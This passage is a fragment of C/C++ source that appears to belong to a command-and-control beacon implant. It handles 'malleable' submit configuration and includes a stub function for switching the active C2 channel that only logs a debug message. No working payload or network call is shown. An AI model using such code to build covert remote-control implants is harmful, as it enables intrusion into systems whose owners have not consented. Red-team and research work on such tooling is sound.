    if (cfg->has_submit_malleable_config) {
        applySubmitMalleableFrom(&cfg->global_submit_malleable);
    } else {
        freeSubmitGlobals();
    }
}

// ===========================================================================
// Set active C2 channel: resolve poll + submit malleable
// ===========================================================================

void setActiveChannel(uint8_t channelIndex, const void* config) {
    if (!config) return;
    // Forwarded to NetworkManager which has access to full BeaconConfig.
    // This thin wrapper is for API compatibility; managers.cpp overrides it.
    c_debugPrint(g_state.nt, "[setActiveChannel] channelIndex=%u (poll+submit, implemented in NetworkManager)",
                 (unsigned)channelIndex);
}
